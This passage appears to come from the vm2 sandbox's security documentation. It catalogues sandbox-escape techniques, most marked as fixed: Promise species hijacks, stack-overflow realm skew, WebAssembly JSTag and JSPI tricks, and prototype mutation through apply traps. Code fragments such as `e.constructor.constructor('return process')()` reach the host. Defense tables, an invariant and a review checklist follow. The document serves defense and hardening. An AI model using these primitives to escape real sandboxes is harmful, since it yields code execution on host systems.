15. **Host prepareStackTrace + Array.fromAsync + SuppressedError** [Categories 4, 7, 16, 19] (NOW FIXED): Walk prototype chain to get host Array, call `Array.fromAsync` for host promise, use `using` + Error Generation Primitive to create SuppressedError with host TypeError, catch via host promise's unsanitized `.catch()`.
16. **Duck-typing + showProxy + handler.get() with forged target** [Categories 1, 9] (NOW FIXED): Obtain handler via showProxy, use host-side `Array.reduce` to call `handler.get(rawHostFunction, 'constructor')`, leaking raw host `Function` via prototype chain fallback.
17. **Descriptor Extraction + Object.entries + Array Unwrap** [Categories 1, 15]: Get property descriptor for `Function.prototype.constructor`, build nesting via chained `getOwnPropertyDescriptors`, extract with `Object.entries()`. Defense: recursive `containsDangerousConstructor` with cycle detection.
18. **SuppressedError + Symbol Name Trick** [Categories 4, 16]: `DisposableStack.defer()` or `using` with dispose method triggering Error Generation Primitive. `SuppressedError` wraps unsanitized host TypeError. Also works with `AsyncDisposableStack`.
19. **WebAssembly JSTag Exception Catch** [Categories 4, 12, 17]: Wasm module imports JSTag and trigger function. Trigger causes host TypeError via Error Generation Primitive. Wasm `try_table/catch` catches and returns unsanitized externref.
20. **Array Species Self-Return + Object.assign** [Categories 3, 10, 18]: Create host array, set up self-referential species constructor, inject via `Object.assign` (bypasses proxy `set` trap), call `r.map(f)` for raw host values. Chain `cwu` calls to extract host `Function`.
21. **Host Built-in Identity Leak via Proto Walk** [Categories 1, 2, 8] (NOW FIXED): Walk the prototype chain via `({}).__lookupGetter__('__proto__')` composed with `Buffer.apply` (or any host-bound `__proto__` getter) to terminate at host `Object.prototype`, then read `.constructor` to obtain a *reference* to host `Object` whose identity is disjoint from sandbox `Object`. The original symbol-filter patch (commit `67bc511`) closed the demonstrated RCE payload but left this primitive intact — any future bypass that turns "I have a host built-in handle" into "I can read a host symbol or call a host method that bypasses bridge sanitisation" would re-enable the same escape class. Closed structurally by `thisAddIdentityMapping` in `lib/bridge.js` (see Category 8 mitigation).
22. **Async Generator yield*-Return Thenable + Stack-Overflow Realm Skew** [Categories 4, 7, 29] (NOW FIXED): Use `yield*` to a no-`return` inner async iterator, then `.return(thenable)` where the thenable's `.then` synchronously throws via deep recursion. V8's `PromiseResolveThenableJob` captures the throw and the yield* continuation surfaces it as `{ value, done: false }` — bypassing both the transformer's user-`catch` instrumentation and the `globalPromise.prototype.then` rejection sanitiser. Binary-search the recursion depth where the overflow originates inside V8's host C++ code so the `RangeError` is host-realm, then `e.constructor.constructor("return process")()`. Closed by wrapping `%AsyncGeneratorPrototype%.next/.return/.throw` to route iterator-result `.value` and rejections through `handleException`, plus replacing every thenable arg with a sandbox-realm wrapper whose `.then` is a fixed `safeThen` and always-shadowing the non-function branch so V8's re-read of `.then` cannot observe attacker-controlled values.
23. **Host Prototype Mutation via Apply-Trap Indirection + WebAssembly Rejection** [Categories 2, 4, 7, 30] (NOW FIXED): Resolve host `Object.prototype.__proto__` setter via `Buffer.call.call({}.__lookupSetter__, Buffer, "__proto__")` (the `connect()`-aliased sandbox `__lookupSetter__` walks back to host). Trigger a host-realm `TypeError` (e.g., `await WebAssembly.compileStreaming()`). Inside `catch(e)`, call `setProto.call(getProto.call(e), null)` — the apply trap unwraps `context` and forwards to the host setter, severing host `TypeError.prototype.[[Prototype]]` without any write trap firing. The next host `TypeError` from `await WebAssembly.compileStreaming()` walks back into sandbox code through V8 async internals; the bridge's proto-walk no longer finds the registered mapping at the right level and the value falls through unwrapped. `e.constructor.constructor` is then host `Function`. Closed structurally by (A) caching host prototype-mutating intrinsics (`Object.prototype.__proto__` setter, `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.{defineProperty,defineProperties}`, `Reflect.defineProperty`, `Object.prototype.__define{Getter,Setter}__`) and refusing them in the apply trap with one layer of indirection peel for `Function.prototype.{call,apply,bind}` and `Reflect.{apply,construct}`; (B) cache-check on `mappingOtherToThis` before the proto-walk in `thisEnsureThis` so any previously-bridged host value returns the existing proxy even with a tampered proto chain.
24. **Promise Species Hijack + Stack-Overflow Realm Skew** [Categories 4, 7, 18, 29, 31] (NOW FIXED): `class FakePromise extends Promise { static get [Symbol.species]() { return ct } }` reroutes the swallow-tail child constructor inside `localPromise` to a sandbox-controlled `ct`. `ct` rebinds V8's internal `(resolve, reject)` capability to a sandbox collector; trigger a host-realm `RangeError` via `e.stack` after deep recursion (binary-searched depth) inside the downstream chain; V8's `PromiseResolveThenableJob` delivers the raw host Error to the collector — `ex.constructor.constructor("return process")()` then yields RCE. Closed by adding `resetPromiseSpecies(this)` immediately before the swallow-tail `apply(globalPromisePrototypeThen, this, ...)` call so the species protocol always resolves to `localPromise` regardless of the user's subclass `Symbol.species` override.
25. **WebAssembly JSPI Cross-Realm Promise + Species Hijack** [Categories 3, 7, 33] (NOW FIXED): JSPI returns a sandbox-realm Promise with host-realm `Promise.prototype` in its `[[Prototype]]` chain — bypassing both the sandbox-side `.then`/`.catch` overrides and the bridge `apply`-trap callback wrapping. Install `Object.defineProperty(p, 'constructor', {get(){return F}})` directly on the raw object; `p.finally(()=>{})` calls host `Promise.prototype.finally`, whose internal SpeciesConstructor reads F and dispatches the eventual host-realm rejection (host `TypeError` from `WebAssembly.compileStreaming(Promise.resolve(0))`) through F's reject closure with **no bridge wrapping**. `e.constructor.constructor("return process")()` evaluates in host realm because `Function.[[Realm]]` is host → RCE. Closed by deleting `WebAssembly.promising` and `WebAssembly.Suspending` at sandbox bootstrap, mirroring the `WebAssembly.JSTag` removal.

### How The Bridge Defends

| Attack | Defense |
|--------|---------|
| Constructor chain | Returns `{}` for Function constructor access; `isThisDangerousFunctionConstructor` blocks all variants |
| __proto__ access | Intercepts and returns sandbox-side prototype |
| Proxy traps | Wraps Proxy constructor, sanitizes handler objects, null-prototype handlers |
| Symbol.species (Promise) | Unconditionally sets `p.constructor = localPromise` as own data property before every `.then()`/`.catch()` **and before the internal swallow-tail call in `localPromise`'s constructor** (GHSA-76w7-j9cq-rx2j); eliminates TOCTOU and species hijack via subclass `[Symbol.species]` |
| Symbol.species (Array) | Three-layer defense: set/defineProperty traps + neutralizeArraySpecies in apply trap |
| Reflect.construct instanceof bypass | `resetPromiseSpecies` sets constructor on any object, not just `instanceof globalPromise` |
| Species TOCTOU via accessor | Own data property set by `Reflect.defineProperty`; no getter invoked |
| Species TOCTOU via prototype | `globalPromise.prototype` is frozen |
| Symbol.hasInstance bypass | `globalPromise` is frozen |
| Non-extensible promise | `Reflect.defineProperty` fails -> throws `LocalError` |
| Error exploitation | Safe `defaultSandboxPrepareStackTrace`; V8 never falls back to host formatter |
| Promise callbacks | All callbacks wrapped with `ensureThis()` sanitization |
| Promise static methods | All wrapped to use `localPromise` as constructor, ignoring `this` |
| Built-in override | Caches references at init time, uses `Reflect.apply` |
| caller/callee | Throws immediately on access |
| Monkey-patching | Uses cached `Reflect.*` methods, not prototype methods |
| Transformer bypass | Validates against internal variable name patterns |
| Dynamic import | Throws `VMError` unconditionally |
| Prototype trap pollution | Handlers use null-prototype objects |
| Cross-realm symbols | Bridge proxy traps filter dangerous symbols; sandbox overrides reflection APIs |
| Host built-in identity leak | `thisAddIdentityMapping` pre-caches every well-known prototype + constructor in `mappingOtherToThis`/`mappingThisToOther`; cache check in `thisFromOtherWithFactory` short-circuits before wrapping. Function-family prototypes intentionally NOT cached so the dangerous-constructor sentinel still fires. |
| Proxy handler exposure | Closure-scoped WeakMap and conversion methods; `isThisDangerousFunctionConstructor` on `get` trap returns |
| Property descriptor extraction | `containsDangerousConstructor` + `preventUnwrap` blocks unwrapping |
| SuppressedError | `handleException` detects and recursively sanitizes `.error`/`.suppressed` |
| WebAssembly JSTag | `WebAssembly.JSTag` deleted from sandbox |
| WebAssembly JSPI cross-realm Promise | `WebAssembly.promising` and `WebAssembly.Suspending` deleted from sandbox; JSPI promises (sandbox allocation with host-realm `Promise.prototype` and no bridge proxy) cannot be produced, so the species channel on a cross-realm-prototype Promise is structurally unreachable |
| Array species self-return | set/defineProperty traps + neutralizeArraySpecies + SPECIES_ATTACK_SENTINEL |
| Host prepareStackTrace fallback | Safe default always set; setter resets to safe default instead of `undefined` |
| NodeVM `require.root` symlink bypass | `isPathAllowed` realpaths candidate before prefix check; `rootPaths` canonicalized at construction; deny-by-default if realpath throws |
| NodeVM `nesting` + non-config `require` trap (NESTING_OVERRIDE-only resolver) | Constructor destructures first, then throws `VMError` whenever `nesting` is truthy and `requireOpts` is not a non-null object or `Resolver`. Covers every value that collapses to the same insecure resolver: falsy `require` (`false`/`undefined`/`null`/`0`/`''`/omitted), truthy non-object `require` (`true`/number/string/symbol/function), and truthy non-true `nesting` (`1`/`'yes'`/`{}`/`[]`/function). Citing GHSA-m4wx-m65x-ghrr (supersedes GHSA-8hg8-63c5-gwmx) and the README escape-hatch section |
| Sandbox-realm null-proto via bridge `from()` set-trap write-through (GHSA-9vg3-4rfj-wgcm) | `handleException` and sandbox-Promise.then onFulfilled use `ensureThis` (sandbox-realm passthrough); host-Promise rejection sanitiser composes `from()` outside `handleException` so the GHSA-mpf8 invariant still wraps host null-proto values |
| Internal state probe via computed property access on `globalThis` (GHSA-2cm2-m3w5-gp2f) | Bootstrap script declares `let VM2_INTERNAL_STATE_…` at script-top so the binding lands in the context's `[[GlobalLexicalEnvironment]]`; transformer-emitted `${INTERNAL_STATE_NAME}.handleException(…)` resolves there as before, but `globalThis[k]`, `Reflect.get`, descriptor APIs, and own-property enumeration cannot reach it (the global object's own-key table no longer contains the entry). Supersedes the identifier-only mitigation of GHSA-wp5r-2gw5-m7q7 by closing the entire computed-key class structurally. |
| Bridge-internal container via `Array.prototype[N]` setter (Category 28: GHSA-9qj6-qjgg-37qq Variant A + GHSA-q3fm-4wcw-g57x Variant B) | Variant A — `neutralizeArraySpeciesBatch` in `lib/bridge.js` writes saved entries via `thisReflectDefineProperty`; appended slot is an own data property and no sandbox-installed setter is invoked while the bridge holds raw saved state. Variant B — `defaultSandboxPrepareStackTrace` in `lib/setup-sandbox.js` accumulates frames in a string via primitive concatenation rather than an array, removing every reachable `Array.prototype` slot (index setter, getter, and `.join`); `makeCallSiteGetters` installs entries via `localReflectDefineProperty` for symmetry |
| Host prototype mutation via apply trap (GHSA-v6mx-mf47-r5wg) | Apply trap caches the host prototype-mutating intrinsics (`Object.prototype.__proto__` setter, `Object.setPrototypeOf`, `Reflect.setPrototypeOf`, `Object.{defineProperty,defineProperties}`, `Reflect.defineProperty`, `__defineSetter__`, `__defineGetter__`) in `dangerousHostProtoMutators` and refuses any invocation reaching them — direct or via one-layer indirection through `Function.prototype.{call,apply,bind}` / `Reflect.{apply,construct}`. Read-side defense-in-depth in `thisEnsureThis` cache-checks `mappingOtherToThis` before the proto-walk so any previously-bridged host value returns the existing proxy even when its prototype chain has been tampered with by some other route. |
| Bridge `set` trap ignores spec `Receiver` (GHSA-c4cf-2hgv-2qv6) | `BaseHandler.set` gates host-write forwarding on `receiver === mappingOtherToThis.get(object)`; non-canonical receivers (inherited-receiver writes via `Object.create(proxy)`, forged-receiver `Reflect.set` calls, `Object.assign(child, src)` loops) install on `receiver` via `Reflect.defineProperty`, mirroring `ReadOnlyHandler.set` |
| NodeVM builtin denylist bypass via `process` / `inspector/promises` (GHSA-rp36-8xq3-r6c4) | `DANGEROUS_BUILTINS` extended to include `process`; matching promoted to family-prefix via `isDangerousBuiltin(key)` so subpath builtins (`inspector/promises`, future `inspector/*`, `process/*`, `module/*`) share fate with their canonical name. `node:` URL prefix stripped before lookup. Enforced at both `BUILTIN_MODULES` source and `addDefaultBuiltin`. Supersedes the GHSA-947f-4v7f-x2v8 exact-match mitigation. |
| NodeVM wildcard exposes underscored network builtins (GHSA-r9pm-gxmw-wv6p) | `BUILTIN_MODULES` filter in `lib/builtin.js` now excludes any name starting with `_`; `'*'` no longer expands to `_http_client`/`_http_server`/`_tls_wrap`/`_stream_*` etc. Explicit opt-in (`builtin: ['_http_client']`) and `mock`/`override` paths still work via `addDefaultBuiltin`. |
| NodeVM process-wide observability builtins (GHSA-9g8x-92q2-p28f, GHSA-m5w8-4gq2-6f8x) | `DANGEROUS_BUILTINS` denylist extended with `diagnostics_channel`, `async_hooks`, `perf_hooks`, `v8` and (GHSA-m5w8-4gq2-6f8x) `os`, `dns`; filtered out of `BUILTIN_MODULES` (closes `'*'` wildcard) and rejected in `addDefaultBuiltin` via `isDangerousBuiltin` (closes explicit allowlist and `makeBuiltins([...])`). `node:` prefix normalized and family-prefix subpath matching applied (covers `node:os`, `node:dns`, `dns/promises`). `os.setPriority` / `dns.setServers` / `dns.setDefaultResultOrder` host-process writes closed alongside the read leaks. `mocks`/`overrides` escape hatch preserved for sandbox-local replacements |

### Key Security Invariant: Promise Species Resolution Timing

The Promise species defense relies on a critical timing invariant:

```
resetPromiseSpecies(p)          <- sets p.constructor = localPromise (own data property)
  | (no user code can run)
apply(globalPromiseThen, p, []) <- V8 internally reads p.constructor for species
  | (synchronous C++ code)
species = p.constructor[Symbol.species]  <- reads localPromise (frozen)
  |
new localPromise(executor)      <- creates safe result promise
```

This invariant holds because:

1. **Data property, not accessor**: `Reflect.defineProperty` sets a plain value -- V8 reads it without invoking any getter.
2. **No interleaving**: Between `defineProperty` and V8's internal read, only callback wrapping occurs. No user code executes.
3. **Cached references**: `apply` = cached `Reflect.apply`, `globalPromiseThen` = closure variable. Neither can be intercepted.
4. **Frozen species chain**: `localPromise[Symbol.species]` returns `localPromise` via a getter on the frozen `globalPromise`. The getter simply returns `this`.
5. **V8 rejects Proxy receivers**: V8's `IsPromise` internal slot check rejects Proxies with "incompatible receiver" TypeError.

Any future changes to species reset must preserve this invariant: **no user-observable operation may occur between setting the constructor and V8's species resolution**.

---

## Security Checklist for Bridge Changes

When modifying `bridge.js`, `setup-sandbox.js`, or `transformer.js`, answer these questions:

1. **Does this change expose any new return path for host objects?** Every return value from proxy traps and bridge functions must be sanitized.
2. **Can sandbox code call this method directly (not through a proxy)?** Methods accessible on handler objects or prototypes can be called with attacker-controlled arguments.
3. **Does this method accept parameters that could be attacker-controlled?** Parameters like `target`, `receiver`, or callback arguments may be forged.
4. **Are all Reflect.* calls using cached references?** Sandbox-side `Reflect` overrides must not affect bridge internals.
5. **Could this path be triggered by V8 internal algorithms (bypassing proxy traps)?** V8 C++ code like ArraySpeciesCreate, FormatStackTrace, and PromiseResolveThenableJob operate on raw objects.
6. **Does this handle all error types that could be thrown (including host-realm errors)?** Any try/catch in bridge code might catch host errors that need sanitization.
7. **Are there any new well-known symbols that need filtering?** New symbols could provide cross-realm communication channels.
